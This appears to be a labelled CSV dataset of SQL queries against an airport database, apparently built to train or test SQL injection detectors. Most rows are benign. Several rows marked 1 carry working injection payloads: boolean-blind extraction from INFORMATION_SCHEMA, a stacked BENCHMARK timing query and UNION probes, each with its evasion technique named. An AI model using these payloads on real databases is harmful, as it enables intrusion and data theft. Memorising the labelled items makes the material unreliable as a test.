"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""REG In Salah Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,REG In Salah Airport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1939"" AS SIGNED) AND a.iso_country = ""AT"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1939 AT,,,,select,airport-S22,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""3GA7"") OR name LIKE ""Holbaek, Holbæk Flyveplads""",0,"3GA7 Holbaek, Holbæk Flyveplads",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""IQ"" GROUP BY r.name ORDER BY r.name ASC;",0,IQ,,,,select,airport-S5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Aiwo"";",0,Aiwo,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE continent = ""OC"" AND iso_region LIKE ""JP-17""",0,OC JP-17,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 874.0 AND 2796.0",0,874.0 2796.0,,,,select,airport-S2,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (59157, 3702, ""YMLD"", ""TWR"", ""CTAF"", 119.0)",0,59157 3702 YMLD TWR CTAF 119.0,,,,insert,airport-I8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(5147,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/17,1),1,1))>103)/**/THEN/**/5147/**/ELSE/**/0x3A/**/END)/**/AND/**/""gqdB""=""gqdB"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(5147,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/17,1),1,1))>103)/**/THEN/**/5147/**/ELSE/**/0x3A/**/END)/**/AND/**/""gqdB""=""gqdB Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""I39, Madison"") OR name LIKE ""Campo volo Il Laghetto""",0,"I39, Madison Campo volo Il Laghetto",,,,select,airport-S10,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""IT-0323"", ""small_airport"", ""Yeysk Airport"", -35.288753, -54.246387481689)",0,IT-0323 small_airport Yeysk Airport -35.288753 -54.246387481689,,,,insert,airport-I1,,,test
"DELETE FROM airport WHERE ident=""MUHA"";",0,MUHA,,,,delete,airport-D1,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-1895"",""small_airport') AS uOlU WHERE 8673=8673 AND MAKE_SET/**/(1971=1971,6657)-- mynf"", ""Śniatowo Air Base"",""https://en.wikipedia.org/wiki/Abqaiq_Airport"",""SA"")",1," US-1895 small_airport') AS uOlU WHERE 8673=8673 AND MAKE_SET/**/(1971=1971,6657)-- mynf Śniatowo Air Base https://en.wikipedia.org/wiki/Abqaiq_Airport SA ",recon,commentbeforeparentheses,failure,insert,airport-I3,boolean-12,boolean,test
GRANT ALL ON mysql.* TO 'mysql'@'localhost' WITH GRANT OPTION;,0,,,,,admin,airport-admin7,,,test
"DELETE FROM regions WHERE name = ""Turnisce"";",0,Turnisce,,,,delete,airport-D8,,,test
"SELECT * FROM airport WHERE icao_code = 'UKKK' AND 6732 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),13,1))>105) THEN 6732 ELSE (SELECT 9758 UNION SELECT 3204) END))-- -';",1," UKKK' AND 6732 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),13,1))>105) THEN 6732 ELSE (SELECT 9758 UNION SELECT 3204) END))-- - ",exploit,equaltolike,success,select,airport-S1,boolean-156,boolean,test
"SELECT * FROM airport WHERE gps_code = ""RK3D"" OR local_code = ""39FA""",0,RK3D 39FA,,,,select,airport-S4,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""São Pedro do Ivaí;""",0,São Pedro do Ivaí,,,,select,airport-S21,,,test
"DELETE FROM airport WHERE name LIKE ""Přerov Air Base"" OR keywords LIKE ""Aeropuerto Nacional de Salto del Guaira"";  ",0,Přerov Air Base Aeropuerto Nacional de Salto del Guaira,,,,delete,airport-D3,,,test
"UPDATE airport SET name = ""Indian Hill Resort Airport"" WHERE ident = ""IN-0246""",0,Indian Hill Resort Airport IN-0246,,,,update,airport-U1,,,test
SELECT * FROM airport WHERE icao_code = 'KVTN';,0,KVTN,,,,select,airport-S1,,,train
"SELECT id FROM airports WHERE scheduled_service = ""no"" AND type = ""small_airport"" AND name LIKE ""%uWaMMG7ZGayfYpYX8B5p%""",0,no small_airport uWaMMG7ZGayfYpYX8B5p,,,,select,airport-S23,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AU-0580','US-9876','FBKW','MX-1955');",0,AU-0580 US-9876 FBKW MX-1955,,,,update,airport-U10,,,test
"DELETE FROM airport WHERE ident=""MO26"";",0,MO26,,,,delete,airport-D1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Arkansas Valley Regional Medical Center Heliport"");",0,Arkansas Valley Regional Medical Center Heliport,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SN"" GROUP BY r.name ORDER BY r.name ASC;",0,SN,,,,select,airport-S16,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""LT-0010"", ""small_airport"", ""Intertherm Durban Heliport"", 41.691399, 23.122964, 7546.0)",0,LT-0010 small_airport Intertherm Durban Heliport 41.691399 23.122964 7546.0,,,,insert,airport-I2,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ET"" OR c.name LIKE CONCAT(""%"", ""Malta"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > -2595')))/**/ORDER/**/BY/**/1--/**/- ORDER BY navaid_count DESC;",1, ET Malta -2595')))/**/ORDER/**/BY/**/1--/**/- ,recon,space2comment,success,select,airport-S20,union-254,union,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""KR""",0,KR,,,,select,airport-S9,,,test
SELECT * FROM airport WHERE icao_code = 'SKPR';,0,SKPR,,,,select,airport-S1,,,test
"SELECT id FROM airports WHERE elevation_feet <= 1562.0 AND longitude >= 9.224722 AND type IN (""heliport"",""small_airport"",""small_airport"")",0,1562.0 9.224722 heliport small_airport small_airport,,,,select,airport-S23,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 1150.0",0,US 1150.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Cachoeira Airport"");",0,Fazenda Cachoeira Airport,,,,select,airport-S12,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""TH"" OR c.name LIKE CONCAT(""%"", ""Haiti'))   AS     rZBM   WHERE   5518=5518  ORDER    BY     1#"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",1, TH Haiti'))   AS     rZBM   WHERE   5518=5518  ORDER    BY     1# 5 ,recon,multiplespaces,success,select,airport-S20,union-254,union,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""SE-S"", ""New Providence"", ""EU"", ""LS"", ""https://en.wikipedia.org/wiki/Galaţi_County"", ""Airports in Dakhlet Nouadhibou Region"")",0,SE-S New Providence EU LS https://en.wikipedia.org/wiki/Galaţi_County Airports in Dakhlet Nouadhibou Region,,,,insert,airport-I4,,,test
"DELETE FROM airport WHERE name LIKE ""Fort Simpson (Great Slave No. 1) Heliport"" OR keywords LIKE ""JN4"";  ",0,Fort Simpson (Great Slave No. 1) Heliport JN4,,,,delete,airport-D3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Tambeiskoye Sever field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Tambeiskoye Sever field,,,,select,airport-S14,,,test
"UPDATE airport_frequencies SET description = ""Shell"" WHERE airport_ident = ""KMCF"";",0,Shell KMCF,,,,update,airport-U5,,,test
"INSERT INTO countries (code, name, continent) VALUES (""GP"", ""Brazil"", ""AF"")",0,GP Brazil AF,,,,insert,airport-I7,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,LA 4,,,,select,airport-S19,,,test
"UPDATE airport SET municipality = ""Edison"" WHERE iso_country = ""JP""",0,Edison JP,,,,update,airport-U2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DM"" GROUP BY r.name ORDER BY r.name ASC;",0,DM,,,,select,airport-S16,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""DE"" OR c.name LIKE CONCAT(""%"", ""Tajikistan"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,DE Tajikistan 3,,,,select,airport-S20,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AR"" GROUP BY r.name ORDER BY r.name ASC;",0,AR,,,,select,airport-S5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""IT"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,IT 4,,,,select,airport-S19,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-9429"", ""small_airport"", ""C 331 Heliport"", 47.048301696777344, -47.04688, 732.0)",0,US-9429 small_airport C 331 Heliport 47.048301696777344 -47.04688 732.0,,,,insert,airport-I2,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""EH0015, Maastricht Universitair Medisch Centrum Heliport"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""RCAF, BCATP"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Boramae Hyundai Apartment"", ""%"");",0,"EH0015, Maastricht Universitair Medisch Centrum Heliport RCAF, BCATP Boramae Hyundai Apartment",,,,select,airport-S17,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IE""",0,IE,,,,select,airport-S9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SK-219"";",0,SK-219,,,,select,airport-S7,,,test
"DELETE FROM airport WHERE ident=""LFHM"";",0,LFHM,,,,delete,airport-D1,,,train
"UPDATE countries SET keywords = ""Andorran airports"" WHERE code = ""AS"";",0,Andorran airports AS,,,,update,airport-U8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 4872.0 AND 253.0",0,4872.0 253.0,,,,select,airport-S2,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Stuart Atkinson Municipal Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Stuart Atkinson Municipal Airport,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""EGHD, PLH"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Nigerien airports"", ""%"");",0,"EGHD, PLH Airports in (unassigned) Nigerien airports",,,,select,airport-S18,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (352551, 4346, ""EDNC"", ""COMD POST"", ""780-862-7450"", 122.1)",0,352551 4346 EDNC COMD POST 780-862-7450 122.1,,,,insert,airport-I8,,,test
"SELECT id FROM airports WHERE type IN (""heliport"",""small_airport"",""small_airport"") AND scheduled_service = ""no"" AND name LIKE ""%a8oC7MWW6qkl539hFMkG%"" AND municipality = ""Itarumã"" AND longitude <= 22.401796",0,heliport small_airport small_airport no a8oC7MWW6qkl539hFMkG Itarumã 22.401796,,,,select,airport-S23,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""TZ""",0,TZ,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""BR-SP""",0,AS BR-SP,,,,select,airport-S8,,,test
"SELECT id FROM airports WHERE elevation_feet <= 847.0 AND scheduled_service LIKE ""no"" AND name LIKE ""%zra2x6GL0KKRRVVOsgas%"" AND longitude >= -43.43046",0,847.0 no zra2x6GL0KKRRVVOsgas -43.43046,,,,select,airport-S23,,,test
"SELECT * FROM airport WHERE gps_code = ""SVMW"" OR local_code = ""MG0509""",0,SVMW MG0509,,,,select,airport-S4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Navy Outlying Field Site X Heliport"");",0,Navy Outlying Field Site X Heliport,,,,select,airport-S12,,,test
"SELECT * FROM airport WHERE gps_code = ""KBRG"" OR local_code = ""NY25""",0,KBRG NY25,,,,select,airport-S4,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Entabeni Airstrip""",0,Entabeni Airstrip,,,,select,airport-S3,,,test
"UPDATE airport_frequencies SET frequency_mhz = 118.9 WHERE type = ""CTAF"";",0,118.9 CTAF,,,,update,airport-U6,,,test
"GRANT SELECT,INSERT,DELETE,UPDATE ON mysql.* TO 'admin'@'localhost';",0,,,,,admin,airport-admin9,,,test
SELECT * FROM airport WHERE icao_code = 'VDKK';,0,VDKK,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1501"" AS SIGNED) AND a.iso_country = ""GU"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1501 GU,,,,select,airport-S22,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""SV"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,SV 5,,,,select,airport-S19,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Mar Carboneras"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WAMY, Pangtiku Airport"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Luque, Stroessner, Aeropuerto Internacional Silvio Pettirossi"", ""%"");",0,"Mar Carboneras WAMY, Pangtiku Airport Luque, Stroessner, Aeropuerto Internacional Silvio Pettirossi",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'KGLD';,0,KGLD,,,,select,airport-S1,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Blue Springs;""",0,Blue Springs,,,,select,airport-S21,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 7700.0 AND 509.0",0,7700.0 509.0,,,,select,airport-S2,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CZ""",0,CZ,,,,select,airport-S6,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Imo State"";",0,Imo State,,,,select,airport-S15,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 135.6 AND  34.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  123.6  AND  118.3  ORDER BY frequency;",0,135.6 34.5 123.6 118.3,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""AT3"") OR name LIKE ""Caloc-an""",0,AT3 Caloc-an,,,,select,airport-S10,,,test
"DELETE FROM countries WHERE code = ""TD"";",0,TD,,,,delete,airport-D7,,,test
"DELETE FROM airport WHERE ident=""US-1732"";",0,US-1732,,,,delete,airport-D1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1028.0 AND 9.0",0,1028.0 9.0,,,,select,airport-S2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""PL"") OR a.elevation_ft > 1000.0",0,PL 1000.0,,,,select,airport-S11,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Artigas Department"";",0,Artigas Department,,,,select,airport-S15,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (54153, 2501, ""YDRD"", ""UNIC"", ""KHAMA GND"", 128.96)",0,54153 2501 YDRD UNIC KHAMA GND 128.96,,,,insert,airport-I8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Lotte City Hotel Guro Heliport""",0,Lotte City Hotel Guro Heliport,,,,select,airport-S3,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SV"" OR c.name LIKE CONCAT(""%"", ""China"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,SV China 2,,,,select,airport-S20,,,test
"UPDATE airport SET name = ""Yusuhara Heliport"" WHERE ident = ""RU-0467""",0,Yusuhara Heliport RU-0467,,,,update,airport-U1,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""NG"", ""U.S. Virgin Islands"", ""EU"")));SELECT/**/BENCHMARK(5000000,MD5(0x4b6a4354))#"", ""Kosova"")",1," NG U.S. Virgin Islands EU ));SELECT/**/BENCHMARK(5000000,MD5(0x4b6a4354))# Kosova ",recon,space2comment,failure,insert,airport-I6,stacked-33,stacked,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 670.0 AND 1948.0",0,670.0 1948.0,,,,select,airport-S2,,,test
"INSERT INTO countries (code, name, continent) VALUES (""CI"", ""Micronesia"", ""AS"")",0,CI Micronesia AS,,,,insert,airport-I7,,,test
"DELETE FROM countries WHERE code = ""LR"";",0,LR,,,,delete,airport-D7,,,test
"UPDATE airport SET home_link = ""http://www.pinedaleonline.com/pinedaleairport.HTM"" WHERE name = ""Dorotea Airfield""",0,http://www.pinedaleonline.com/pinedaleairport.HTM Dorotea Airfield,,,,update,airport-U4,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""AU""",0,AU,,,,select,airport-S9,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZW"" OR c.name LIKE CONCAT(""%"", ""Angola"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,ZW Angola 2,,,,select,airport-S20,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BA"" OR c.name LIKE CONCAT(""%"", ""Portugal"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,BA Portugal 2,,,,select,airport-S20,,,test
SELECT * FROM airport WHERE icao_code = 'LWST';,0,LWST,,,,select,airport-S1,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""GB""",0,GB,,,,select,airport-S9,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""MX""",0,MX,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""7NK5"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Grenadian airports"", ""%"");",0,7NK5 Airports in (unassigned) Grenadian airports,,,,select,airport-S18,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Custom Applicators"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Campo di Volo Squadra Avvoltoi, VRISO"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""7XA0"", ""%"");",0,"Custom Applicators Campo di Volo Squadra Avvoltoi, VRISO 7XA0",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'YMND';,0,YMND,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MC"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,MC 2,,,,select,airport-S19,,,test
"DELETE FROM regions WHERE name = ""El Oued Province"";",0,El Oued Province,,,,delete,airport-D8,,,test
"DELETE FROM airport WHERE name = ""Fazenda Nossa Senhora da Salete Airstrip"";  ",0,Fazenda Nossa Senhora da Salete Airstrip,,,,delete,airport-D2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Wellington;""",0,Wellington,,,,select,airport-S21,,,train
"DELETE FROM airport WHERE name LIKE ""Nagoya Intercity Helipad"" OR keywords LIKE ""EGXV, EGXV"";  ",0,"Nagoya Intercity Helipad EGXV, EGXV",,,,delete,airport-D3,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Sumisip;""",0,Sumisip,,,,select,airport-S21,,,test
"DELETE FROM runways WHERE airport_ident = ""67IL"";",0,67IL,,,,delete,airport-D5,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""BR-1427"";",0,BR-1427,,,,select,airport-S7,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Trujillo_Airport"" WHERE ident = ""KZ-0057""",0,https://en.wikipedia.org/wiki/Trujillo_Airport KZ-0057,,,,update,airport-U3,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""MM2M"") OR name LIKE ""O66""",0,MM2M O66,,,,select,airport-S10,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),13,1))>96) then 8191 else (select 7920 union select 3426) end))-- -"");",1," Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),13,1))>96) then 8191 else (select 7920 union select 3426) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Fazenda Araçatuba Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Fazenda Araçatuba Airport,,,,select,airport-S14,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (56676, 38245, ""LTAP"", ""TOWER"", ""Hall Beach radio/traffic, 5nm below 3100,"", 118.325)",0,"56676 38245 LTAP TOWER Hall Beach radio/traffic, 5nm below 3100, 118.325",,,,insert,airport-I8,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (38292, ""1LA9"", 59.0, ""X) As iSlu wHERe 4367=4367 UNiOn alL SeLeCT NulL,NulL,NulL,NulL,NulL,NulL-- -"", 0, 0)",1," 38292 1LA9 59.0 X  As iSlu wHERe 4367=4367 UNiOn alL SeLeCT NulL,NulL,NulL,NulL,NulL,NulL-- - 0 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
